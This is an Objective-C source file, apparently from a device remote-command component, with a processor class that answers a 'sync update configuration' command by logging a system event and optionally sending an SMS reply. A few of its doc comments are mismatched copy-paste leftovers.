/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  SetUpdateConfigurationProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  24/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "SyncUpdateConfigurationProcessor.h"

@interface SyncUpdateConfigurationProcessor (PrivateAPI)
- (void) sendReplySMS;
- (void) processSetUpdateConfiguration;
@end

@implementation SyncUpdateConfigurationProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the SyncUpdateConfigurationProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (SyncUpdateConfigurationProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"SyncUpdateConfigurationProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the SyncUpdateConfigurationProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"SyncUpdateConfigurationProcessor--->doProcessingCommand")
	[self processSetUpdateConfiguration];
}


#pragma mark SyncUpdateConfigurationProcessor Private Methods

/**
 - Method name: processRestartDevice
 - Purpose:This method is used to Restart Devoce
 - Argument list and description: No Return Type
 - Return description: mRemoteCmdCode (NSString *)
*/

- (void) processSetUpdateConfiguration {
	DLog (@"SyncUpdateConfigurationProcessor--->processSetUpdateConfiguration")
	[self sendReplySMS];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
 */

- (void) sendReplySMS {
	DLog (@"SyncUpdateConfigurationProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																					  andErrorCode:_SUCCESS_];
	NSString *syncUpdateConfigMessage=[NSString stringWithFormat:@"%@%@",messageFormat,NSLocalizedString(@"kSyncUpdateConfiguration", @"")];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:syncUpdateConfigMessage];
	
	if ([mRemoteCmdData mIsSMSReplyRequired]) {		
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]
															   andMessage:syncUpdateConfigMessage];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to handle maemory 
 - Argument list and description:No Argument
 - Return description:No Return Type
*/

-(void) dealloc {
	[super dealloc];
}

@end
